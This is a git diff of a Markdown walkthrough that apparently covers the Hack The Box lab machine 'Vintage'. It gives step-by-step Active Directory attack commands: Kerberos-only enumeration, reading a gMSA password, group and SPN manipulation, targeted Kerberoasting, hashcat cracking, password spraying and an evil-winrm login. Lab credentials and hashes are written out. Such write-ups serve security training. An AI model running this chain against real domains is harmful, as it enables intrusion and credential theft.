@@ -8,32 +8,143 @@
 IP target: 10.129.231.205
 Credentials: P.Rosa:Rosaisbest123
 
-### Port Scanning
+### 1.1 Port Scanning
 
-We begin our enumeration by mapping the open ports and services on the target using Nmap. 
-We use -sC to run default enumeration scripts, -sV to determine service versions, and -vv to print the output as it's discovered
+The assessment began with a comprehensive network port scan using Nmap to identify exposed services and map the target's attack surface. We utilized the **-sC** flag for default enumeration scripts and **-sV** for service version detection.
 `
 sudo nmap -sC -sV -oA nmap/vintage 10.129.231.205   
 `
 
 <img width="1003" height="533" alt="image" src="https://github.com/user-attachments/assets/1982cffe-79f1-42c9-9fd7-2d94eb9f506c" />
 
-## 2. Enumeration & Initial Access
-### SMB & Authentication Mechanisms
+The scan revealed a standard Active Directory environment (DNS, Kerberos, SMB, LDAP). Notably, LDAPS (port 636) was TCP-wrapped, meaning it strictly enforced SSL client certificates for connections. Based on the exposed services, we updated our local **/etc/hosts** file to resolve **vintage.htb** and **dc01.vintage.htb** to the target IP, which is a strict requirement for Kerberos authentication.
 
+## 2. Enumeration & Initial Access
+
+### 2.1 SMB & Authentication Mechanisms
+
+Initial attempts to authenticate using the provided credentials via standard NTLM protocols failed. It was determined that **NTLM authentication is completely disabled** on this domain. Consequently, all authentication attempts had to be routed through Kerberos.
+Kerberos is highly sensitive to hostname resolution, therefore, we targeted the Fully Qualified Domain Name (FQDN) rather than the IP address, passing the **-k** flag to NetExec (NXC) to force Kerberos authentication.
 `
 nxc smb dc01.vintage.htb -u P.Rosa -p 'Rosaisbest123' -k
 `
 
 <img width="1116" height="65" alt="image" src="https://github.com/user-attachments/assets/23c4cd69-4928-4dce-83f3-82080d60206a" />
 
+We then verified our access and enumerated domain users:
+
 `nxc smb dc01.vintage.htb -u P.Rosa -p 'Rosaisbest123'  -k --users `
 
 <img width="1356" height="317" alt="image" src="https://github.com/user-attachments/assets/79c4a9f1-7b8e-4c4a-bcbb-ac1160c57fd4" />
 
-### Active Directory Enumeration (BloodHound)
+### 2.2 Active Directory ACL Enumeration (BloodHound)
 
-
+Using Bloodhound, we can see that the two users, L. Bianchi and C. Neri, can be added to the DELEGATEDADMINS group. 
 <img width="1206" height="356" alt="image" src="https://github.com/user-attachments/assets/01959115-fe53-4c44-ad18-c7d394680b7c" />
 
+They can then use the AllowedToAct privilege to become DC administrators.
 <img width="971" height="347" alt="image" src="https://github.com/user-attachments/assets/f0e49c1f-013b-4c36-9a6c-58ce10823443" />
+
+Now, to better understand this, let's take a look at the users.json file
+
+`cat 20260402090810_vintage-htb_users.json | jq '.data[].Properties | select(.samaccountname) | "\(.pwdlastset):\(.samaccountname)"' -r | sort -n `
+
+
+<img width="1217" height="273" alt="image" src="https://github.com/user-attachments/assets/ca01f6a4-1958-4052-9866-c221527a7191" />
+
+We see that some users changed their passwords at the exact same time; this could indicate that they are using the same password. but the most important thing is this service account: **gMSA01$** 
+
+<img width="737" height="216" alt="image" src="https://github.com/user-attachments/assets/a82ea4ba-4da0-4908-be34-bffcc1a15625" />
+
+We can see that the DOMAIN COMPUTERS group can read the password for GMSA01, and FS01 is a member of this group. 
+
+<img width="782" height="115" alt="image" src="https://github.com/user-attachments/assets/4ab6d1f2-8f06-4025-a7ac-e4f2b42348e4" />
+
+We can see that FS01 is part of the “PRE-WINDOWS 2000 COMPATIBLEACCESS@VINTAGE.HTB” group. When a computer is part of this group, it means that its password matches the computer's name, but in all lowercase letters.
+
+`https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts`
+
+`nxc smb dc01.vintage.htb -k -u 'fs01$' -p fs01`
+<img width="1107" height="57" alt="image" src="https://github.com/user-attachments/assets/bac1b3ce-b994-4d47-a683-c8cef15ad9b3" />
+
+`nxc ldap dc01.vintage.htb -k -u 'fs01$' -p fs01 --gmsa`
+
+This is how we obtain the NTLM hash of the password
+
+` bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k add groupMember ServiceManagers 'gmsa01$' `
+
+We have added gmsa01 to the servicemanagers group. A classic Kerberoasting attack (used to obtain a service's hash) only works if the target account has a Service Principal Name (SPN) configured. The service accounts we identified do not have a default SPN. However, since GMSA has GenericAll permissions on those accounts, it has the right to create a dummy SPN for those accounts, perform Kerberoasting, and then delete the SPN to leave no trace. This is called Targeted Kerberoasting.
+
+<img width="1114" height="398" alt="image" src="https://github.com/user-attachments/assets/850cfa72-184c-4eba-964d-53f24764b3e5" />
+
+
+`getTGT.py 'vintage.htb/gmsa01$' -dc-ip 10.129.231.205 -hashes :0851299c01b944d01099fc977eaa6c67 `
+
+
+<img width="809" height="77" alt="image" src="https://github.com/user-attachments/assets/05959753-0f01-4e49-9d73-765fcc01d916" />
+
+`KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb --request-user svc_ark`
+
+<img width="1118" height="61" alt="image" src="https://github.com/user-attachments/assets/4dbbf6ca-3f6e-4da4-8a8d-e70227941f93" />
+Let's reactivate the LDAP service account
+`KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb`
+
+<img width="1909" height="383" alt="image" src="https://github.com/user-attachments/assets/71eb6824-99f2-476a-b79f-6e8699cfc591" />
+remove the uac
+`bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k remove uac svc_sql -f ACCOUNTDISABLE`
+
+<img width="1241" height="61" alt="image" src="https://github.com/user-attachments/assets/09a28c77-bc02-4a84-9b56-805c551e8cb1" />
+
+Now we get three hashes
+
+` KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb`
+
+<img width="1905" height="593" alt="image" src="https://github.com/user-attachments/assets/d38cc787-8d49-4052-a9a3-ed8e3cb9aa2a" />
+
+`bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k set object svc_sql servicePrincipalName -v 'hhttp/sql'`
+
+<img width="1355" height="43" alt="image" src="https://github.com/user-attachments/assets/0f4e9899-8916-4c68-8354-90ca2a6f247a" />
+
+`bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k set object svc_ark servicePrincipalName -v 'http/ark'`
+
+<img width="1351" height="52" alt="image" src="https://github.com/user-attachments/assets/c0f98dd0-fa25-4ae3-bdb0-597e0a35f322" />
+
+
+`bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k set object svc_ldap servicePrincipalName -v 'http/ldap'`
+
+<img width="1353" height="43" alt="image" src="https://github.com/user-attachments/assets/668e1a3a-3e66-4cd3-826d-af2e452e0af5" />
+
+`nxc ldap dc01.vintage.htb -k -u 'gmsa01$' -H 0851299c01b944d01099fc977eaa6c67 -k --kerberoasting nxc.hashes`
+
+<img width="1904" height="619" alt="image" src="https://github.com/user-attachments/assets/00731e59-5abb-43ce-aa4e-6647d3f7fae8" />
+
+crack the hash:
+
+`hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt --force`
+
+<img width="1896" height="162" alt="image" src="https://github.com/user-attachments/assets/c32b7e34-e188-4a59-ae22-bbaa8efd91c5" />
+
+We find that the c.neri account can log in using the password we discovered, and using Bloodhound, we see that it is in the “REMOTE MANAGEMENT USERS@VINTAGE.HTB” group.
+
+<img width="1238" height="301" alt="image" src="https://github.com/user-attachments/assets/a1a1453a-a699-45da-9c76-af7d0bf25bd0" />
+
+`nxc ldap dc01.vintage.htb -k -u users.txt -p Zer0the0ne -k --continue-on-success`
+
+<img width="978" height="393" alt="image" src="https://github.com/user-attachments/assets/7dbb2091-caa6-4a5a-ad2b-9eb8adc8d0ae" />
+
+Let's generate the file to communicate with the DC
+
+` nxc smb dc01.vintage.htb -u c.neri -p Zer0the0ne --generate-krb5-file vintage.krb5 `
+
+<img width="1091" height="86" alt="image" src="https://github.com/user-attachments/assets/901616a0-317e-4994-b69a-ea293e6aeb25" />
+
+We are requesting the TGT ticker for C. Neri
+
+`getTGT.py vintage.htb/c.neri:Zer0the0ne -dc-ip 10.129.231.205`
+
+We're in
+
+`KRB5CCNAME=c.neri.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb `
+
+
+
